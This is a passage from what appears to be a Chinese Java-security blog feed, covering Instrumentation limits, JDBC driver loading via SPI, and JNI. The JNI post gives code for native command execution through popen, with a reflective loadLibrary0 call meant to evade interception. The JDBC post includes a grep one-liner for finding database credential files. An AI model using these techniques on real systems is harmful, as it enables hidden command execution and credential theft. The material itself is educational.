加载对应的agent，过程大致如下：</p><ol><li>创建并初始化JPLISAgent；</li><li>解析 javaagent 里 MANIFEST.MF 里的参数；</li><li>创建 InstrumentationImpl 对象；</li><li>监听 ClassFileLoadHook 事件；</li><li>调用 InstrumentationImpl 的<code>loadClassAndCallAgentmain</code>方法，在这个方法里会去调用javaagent里 MANIFEST.MF 里指定的<code>Agent-Class</code>类的<code>agentmain</code>方法。</li></ol><h2 id="Instrumentation局限性"><a href="#Instrumentation局限性" class="headerlink" title="Instrumentation局限性"></a>Instrumentation局限性</h2><p>大多数情况下，我们使用Instrumentation都是使用其字节码插桩的功能，或者笼统说就是类重定义(Class Redefine)的功能，但是有以下的局限性：</p><ol><li>premain和agentmain两种方式修改字节码的时机都是类文件加载之后，也就是说必须要带有Class类型的参数，不能通过字节码文件和自定义的类名重新定义一个本来不存在的类。</li><li>类的字节码修改称为类转换(Class Transform)，类转换其实最终都回归到类重定义Instrumentation#redefineClasses()方法，此方法有以下限制：<ol><li>新类和老类的父类必须相同；</li><li>新类和老类实现的接口数也要相同，并且是相同的接口；</li><li>新类和老类访问符必须一致。 新类和老类字段数和字段名要一致；</li><li>新类和老类新增或删除的方法必须是private static/final修饰的；</li><li>可以修改方法体。</li></ol></li></ol><p>除了上面的方式，如果想要重新定义一个类，可以考虑基于类加载器隔离的方式：创建一个新的自定义类加载器去通过新的字节码去定义一个全新的类，不过也存在只能通过反射调用该全新类的局限性。</p>]]></content>
    
    
    <categories>
      
      <category>language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JDBC基础</title>
    <link href="/2023/03/15/JDBC%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/03/15/JDBC%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="JDBC-基础"><a href="#JDBC-基础" class="headerlink" title="JDBC 基础"></a>JDBC 基础</h1><p><code>JDBC(Java Database Connectivity)</code>是 Java 提供对数据库进行连接、操作的标准 API。Java 自身并不会去实现对数据库的连接、查询、更新等操作而是通过抽象出数据库操作的 API 接口(<code>JDBC</code>)，不同的数据库提供商必须实现 JDBC 定义的接口从而也就实现了对数据库的一系列操作。</p><h2 id="JDBC-Connection"><a href="#JDBC-Connection" class="headerlink" title="JDBC Connection"></a>JDBC Connection</h2><p>Java 通过<code>java.sql.DriverManager</code>来管理所有数据库的驱动注册，所以如果想要建立数据库连接需要先在<code>java.sql.DriverManager</code>中注册对应的驱动类，然后调用<code>getConnection</code>方法才能连接上数据库。</p><p>JDBC 定义了一个叫<code>java.sql.Driver</code>的接口类负责实现对数据库的连接，所有的数据库驱动包都必须实现这个接口才能够完成数据库的连接操作。<code>java.sql.DriverManager.getConnection(xx)</code>其实就是间接的调用了<code>java.sql.Driver</code>类的<code>connect</code>方法实现数据库连接的。数据库连接成功后会返回一个叫做<code>java.sql.Connection</code>的数据库连接对象，一切对数据库的查询操作都将依赖于这个<code>Connection</code>对象。</p><p>JDBC 连接数据库的一般步骤:</p><ol><li>注册驱动，<code>Class.forName(&quot;数据库驱动的类名&quot;)</code>。</li><li>获取连接，<code>DriverManager.getConnection(xxx)</code>。</li></ol><p><strong>JDBC 连接数据库示例代码如下:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> com.mysql.jdbc.Driver;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dbconn</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, SQLException </span>&#123;<br>        Class.forName(<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>);<span class="hljs-comment">//注册驱动类</span><br>        DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/mysql&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;administrator&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>传统的 Web 应用的数据库配置信息一般都是存放在<code>WEB-INF</code>目录下的<code>*.properties</code>、<code>*.yml</code>、<code>*.xml</code>中的,如果是<code>Spring Boot</code>项目的话一般都会存储在 jar 包中的<code>src/main/resources/</code>目录下。常见的存储数据库配置信息的文件路径如：<code>WEB-INF/applicationContext.xml</code>、<code>WEB-INF/hibernate.cfg.xml</code>、<code>WEB-INF/jdbc/jdbc.properties</code>，一般情况下使用 find 命令加关键字可以轻松的找出来，如查找 Mysql 配置信息: <code>find 路径 -type f |xargs grep &quot;com.mysql.jdbc.Driver&quot;</code>。</p><p>第一步可见是<code>反射+初始化类</code>往<code>DriverManager</code>注册了 JDBC 驱动类</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220411221037961.png"></p><p>然而，如果不进行注册驱动类，也可以也可以连接数据库，为了直观说明，列出所有数据库</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Statement st = conn.createStatement();<br>        ResultSet resultSet = st.executeQuery(<span class="hljs-string">&quot;show databases&quot;</span>);<br>        <span class="hljs-keyword">while</span> (resultSet.next()) &#123;<br>            System.out.println(resultSet.getString(<span class="hljs-number">1</span>));<br>        &#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220412150844759.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220412150916179.png"></p><p>这里需要介绍到 Java 的一大特性:<code>Java SPI(Service Provider Interface)</code></p><p>我们知道 JVM 中由三个类加载器，<code>BootstrapClassLoader</code>，<code> ExtClassLoader</code>，<code>AppClassLoader</code>。其采用双亲委派模式。同时 JDK 也建议我们在加载类的时候使用这种方式。但是如果 SPI 使用这种方式就会导致找不到类的问题。</p><p>我们知道 JDBC 中的接口是 Java 的核心包，在 rt.jar 中，这个 jar 是由<code>BootstrapClassLoadre</code>来加载的。</p><p>其次，SPI 的加载规则是根据 jar 包中 META-INF 下 services 下的文件来查找对应实现类的。在 META-INF 下 services 下会定义一个文件，其文件名是接口类的全类型，而文件的内容是实现类的全类名。</p><p>再次，实现类的加载是在<code>DriverManager</code>中来调用，通过<code>Class.forName</code>来加载实现类，而<code>Class.forName</code>使用的是当前类的类加载器，当前类的类加载器是<code>BootstrapClassLoader</code>，我们知道<code>BootstrapClassLoader</code>默认是加载 rt.jar 的。明显第三方实现不在 rt.jar</p><p>最后，怎么解决这个问题呢，SPI 是采用<code>ContextClassLoader</code>来加载第三方实现类，这样就避免了父<code>ClassLoader-BootstrapClassLoader</code>去加载本应该由子<code>ClassLoader-AppClassLoader</code>加载的类。而<code>ContextClassLoader</code>就是被设计来解决这样的问题的。</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220412165959355.png"></p><p><code>DriverManager</code>在初始化的时候会调用<code>java.util.ServiceLoader</code>类提供的 SPI 机制，Java 会自动扫描 jar 包中的<code>META-INF/services</code>目录下的文件，并且还会自动的<code>Class.forName(文件中定义的类)</code>，这也就解释了为什么不需要<code>Class.forName</code>也能够成功连接数据库的原因了。</p>]]></content>
    
    
    <categories>
      
      <category>language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JNI安全基础</title>
    <link href="/2023/03/15/JNI%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/03/15/JNI%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="JNI-安全基础"><a href="#JNI-安全基础" class="headerlink" title="JNI 安全基础"></a>JNI 安全基础</h1><h2 id="JNI-简介"><a href="#JNI-简介" class="headerlink" title="JNI 简介"></a>JNI 简介</h2><p>java native interface</p><p>一般情况下，我们完全可以使用 Java 语言编写程序，但某些情况下，Java 可能会不满足应用程序的需求，或者是不能更好的满足需求，比如：</p><ul><li>标准的 Java 类库不支持应用程序平台所需的平台相关功能。</li><li>我们已经用另一种语言编写了一个类库，如何用 Java 代码调用？</li><li>某些运行次数特别多的方法代码，为了加快性能，我们需要用更接近硬件的语言（比如汇编）编写。</li></ul><p>上面这三种需求，其实说到底就是如何用 Java 代码调用不同语言编写的代码。那么 JNI 应运而生了。</p><p>从 Java 1.1 开始，Java Native Interface (JNI)标准就成为 java 平台的一部分，它允许 Java 代码和其他语言写的代码进行交互。JNI 一开始是为了本地已编译语言，尤其是 C 和 C++而设计 的，但是它并不妨碍你使用其他语言，只要调用约定受支持就可以了。使用 java 与本地已编译的代码交互，通常会丧失平台可移植性。但是，有些情况下这样做是可以接受的，甚至是必须的，比如，使用一些旧的库，与硬件、操作系统进行交互，或者为了提高程序的性能。JNI 标准至少保证本地代码能工作在任何 Java 虚拟机实现下。</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2022011915192625.png"></p><p>通过 JNI，我们就可以通过 Java 程序（代码）调用到操作系统相关的技术实现的库函数，从而与其他技术和系统交互，使用其他技术实现的系统的功能；同时其他技术和系统也可以通过 JNI 提供的相应原生接口开调用 Java 应用系统内部实现的功能。</p><p>在 windows 系统上，一般可执行的应用程序都是基于 native 的 PE 结构，windows 上的 JVM 也是基于 native 结构实现的。Java 应用体系都是构建于 JVM 之上。</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2022011915192626.png"></p><p>可能有人会问，Java 不是跨平台的吗？如果用 JNI，那么程序不就将失去跨平台的优点?确实是这样的。</p><p><strong>JNI 的缺点：</strong></p><ul><li><p>程序不再跨平台。要想跨平台，必须在不同的系统环境下重新编译本地语言部分。</p></li><li><p>程序不再是绝对安全的，本地代码的不当使用可能导致整个程序崩溃。一个通用规则是，你应该让本地方法集中在少数几个类当中。这样就降低了 JAVA 和 C 之间的耦合性。</p></li></ul><p>目前来讲使用 JNI 的缺点相对于优点还是可以接受的，可能后面随着 Java 的技术发展，我们不在需要 JNI，但是目前 JDK 还是一直提供对 JNI 标准的支持。</p><h2 id="定义-native-方法"><a href="#定义-native-方法" class="headerlink" title="定义 native 方法"></a>定义 native 方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandExec</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> String <span class="hljs-title">exec</span><span class="hljs-params">(String command)</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="生成头文件"><a href="#生成头文件" class="headerlink" title="生成头文件"></a>生成头文件</h2><p>JDK10 移除了<code>javah</code>,需要改为<code>javac</code>加<code>-h</code>参数的方式生产头文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">javac -cp . CommandExec.java<br>javah -d package -cp . package.CommandExec<br><br><span class="hljs-comment">#jdk&gt;=10</span><br>javac -cp . .\CommandExec.java -h ./  <span class="hljs-comment">#生成class</span><br><br>javac ./CommandExec.java -h ./<br></code></pre></td></tr></table></figure><p>生成的头文件包含了<code>jni.h</code>，在 jdk 目录下找到<code>include/jni.h</code>以及<code>include/win32/jni_md.h</code>等文件</p><p>在生成的头文件<code>myjavasec_CommandExec.h</code>有着严格的命名规则</p><h2 id="JNI-基础数据类型"><a href="#JNI-基础数据类型" class="headerlink" title="JNI 基础数据类型"></a>JNI 基础数据类型</h2><table><thead><tr><th align="left">Java 类型</th><th align="left">JNI 类型</th><th align="left">C/C++类型</th><th align="left">大小</th></tr></thead><tbody><tr><td align="left">Boolean</td><td align="left">Jblloean</td><td align="left">unsigned char</td><td align="left">无符号 8 位</td></tr><tr><td align="left">Byte</td><td align="left">Jbyte</td><td align="left">char</td><td align="left">有符号 8 位</td></tr><tr><td align="left">Char</td><td align="left">Jchar</td><td align="left">unsigned short</td><td align="left">无符号 16 位</td></tr><tr><td align="left">Short</td><td align="left">Jshort</td><td align="left">short</td><td align="left">有符号 16 位</td></tr><tr><td align="left">Int</td><td align="left">Jint</td><td align="left">int</td><td align="left">有符号 32 位</td></tr><tr><td align="left">Long</td><td align="left">Jlong</td><td align="left">long long</td><td align="left">有符号 64 位</td></tr><tr><td align="left">Float</td><td align="left">Jfloat</td><td align="left">float</td><td align="left">32 位</td></tr><tr><td align="left">Double</td><td align="left">Jdouble</td><td align="left">double</td><td align="left">64 位</td></tr></tbody></table><p><a href="https://blog.csdn.net/qq_25722767/article/details/52557235">jni 中 java 与原生代码通信规则</a></p><h2 id="编写-c-c-代码"><a href="#编写-c-c-代码" class="headerlink" title="编写 c/c++代码"></a>编写 c/c++代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;myjavasec_CommandExec.h&quot;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function">JNIEXPORT jstring</span><br><span class="hljs-function"></span><br><span class="hljs-function">    JNICALL</span><br><span class="hljs-function">    <span class="hljs-title">Java_myjavasec_CommandExec_exec</span><span class="hljs-params">(JNIEnv *env, jclass jclass, jstring str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (str != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        jboolean jsCopy;<br>        <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cmd = env-&gt;<span class="hljs-built_in">GetStringUTFChars</span>(str, &amp;jsCopy);<br>        FILE *fd = <span class="hljs-built_in">popen</span>(cmd, <span class="hljs-string">&quot;r&quot;</span>);<br>        <span class="hljs-keyword">if</span> (fd != <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            string result;<br>            <span class="hljs-keyword">char</span> buf[<span class="hljs-number">128</span>];<br>            <span class="hljs-keyword">while</span> (<span class="hljs-built_in">fgets</span>(buf, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf), fd) != <span class="hljs-literal">NULL</span>)<br>            &#123;<br>                result += buf;<br>            &#125;<br>            <span class="hljs-built_in">pclose</span>(fd);<br>            <span class="hljs-keyword">return</span> env-&gt;<span class="hljs-built_in">NewStringUTF</span>(result.<span class="hljs-built_in">c_str</span>());<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">g++.exe -I<span class="hljs-string">&quot;%JAVA_HOME%\include&quot;</span> -I<span class="hljs-string">&quot;%JAVA_HOME%\include\win32&quot;</span> -shared -o cmd.dll JNI-Exec.cpp<br></code></pre></td></tr></table></figure><p>现在已经生成了对应的 dll 文件，编写一个 java 来调用 dll 文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">VerifyExec</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String COMMAND_CLASS_NAME = <span class="hljs-string">&quot;myjavasec.CommandExec&quot;</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * CommandExec类字节码</span><br><span class="hljs-comment">     * 只有一个public static native String exec(String cmd);的方法</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">byte</span>[] COMMAND_CLASS_BYTES = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]&#123;<br>            -<span class="hljs-number">54</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">70</span>, -<span class="hljs-number">66</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">52</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">12</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">13</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">14</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">60</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">105</span>, <span class="hljs-number">116</span>, <span class="hljs-number">62</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">40</span>, <span class="hljs-number">41</span>, <span class="hljs-number">86</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">67</span>, <span class="hljs-number">111</span>, <span class="hljs-number">100</span>, <span class="hljs-number">101</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, <span class="hljs-number">76</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">101</span>, <span class="hljs-number">78</span>, <span class="hljs-number">117</span>, <span class="hljs-number">109</span>, <span class="hljs-number">98</span>, <span class="hljs-number">101</span>, <span class="hljs-number">114</span>, <span class="hljs-number">84</span>, <span class="hljs-number">97</span>, <span class="hljs-number">98</span>, <span class="hljs-number">108</span>, <span class="hljs-number">101</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">101</span>, <span class="hljs-number">120</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">38</span>, <span class="hljs-number">40</span>, <span class="hljs-number">76</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">47</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">47</span>, <span class="hljs-number">83</span>, <span class="hljs-number">116</span>, <span class="hljs-number">114</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">59</span>, <span class="hljs-number">41</span>, <span class="hljs-number">76</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">47</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">47</span>, <span class="hljs-number">83</span>, <span class="hljs-number">116</span>, <span class="hljs-number">114</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">59</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">83</span>, <span class="hljs-number">111</span>, <span class="hljs-number">117</span>, <span class="hljs-number">114</span>, <span class="hljs-number">99</span>, <span class="hljs-number">101</span>, <span class="hljs-number">70</span>, <span class="hljs-number">105</span>, <span class="hljs-number">108</span>, <span class="hljs-number">101</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-number">67</span>, <span class="hljs-number">111</span>, <span class="hljs-number">109</span>, <span class="hljs-number">109</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">100</span>, <span class="hljs-number">69</span>, <span class="hljs-number">120</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">46</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">21</span>, <span class="hljs-number">109</span>, <span class="hljs-number">121</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">115</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">47</span>, <span class="hljs-number">67</span>, <span class="hljs-number">111</span>, <span class="hljs-number">109</span>, <span class="hljs-number">109</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">100</span>, <span class="hljs-number">69</span>, <span class="hljs-number">120</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">47</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">47</span>, <span class="hljs-number">79</span>, <span class="hljs-number">98</span>, <span class="hljs-number">106</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">116</span>, <span class="hljs-number">0</span>, <span class="hljs-number">33</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">29</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">42</span>, -<span class="hljs-number">73</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">79</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">11</span><br>    &#125;;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        String cmd = <span class="hljs-string">&quot;whoami&quot;</span>;<span class="hljs-comment">// 定于需要执行的cmd</span><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            ClassLoader loader = <span class="hljs-keyword">new</span> ClassLoader(VerifyExec.class.getClassLoader()) &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.findClass(name);<br>                    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>                        <span class="hljs-keyword">return</span> defineClass(COMMAND_CLASS_NAME, COMMAND_CLASS_BYTES, <span class="hljs-number">0</span>, COMMAND_CLASS_BYTES.length);<br>                    &#125;<br>                &#125;<br>            &#125;;<br><br>            <span class="hljs-comment">// 测试时候换成自己编译好的lib路径</span><br>            File libPath = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;D:\\program\\java\\moonlight\\src\\main\\java\\myjavasec\\cmd.dll&quot;</span>);<br><br>            <span class="hljs-comment">// load命令执行类</span><br>            Class commandClass = loader.loadClass(<span class="hljs-string">&quot;myjavasec.CommandExec&quot;</span>);<br><br>            <span class="hljs-comment">// 可以用System.load也加载lib也可以用反射ClassLoader加载,如果loadLibrary0</span><br>            <span class="hljs-comment">// 也被拦截了可以换java.lang.ClassLoader$NativeLibrary类的load方法。</span><br><span class="hljs-comment">//            System.load(&quot;/Users/yz/IdeaProjects/javaweb-sec/javaweb-sec-source/javase/src/main/java/com/anbai/sec/cmd/libcmd.jnilib/libcmd.jnilib&quot;);</span><br>            Method loadLibrary0Method = ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;loadLibrary0&quot;</span>, Class.class, File.class);<br>            loadLibrary0Method.setAccessible(<span class="hljs-keyword">true</span>);<br>            loadLibrary0Method.invoke(loader, commandClass, libPath);<br><br>            String content = (String) commandClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(<span class="hljs-keyword">null</span>, cmd);<br>            System.out.println(content);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
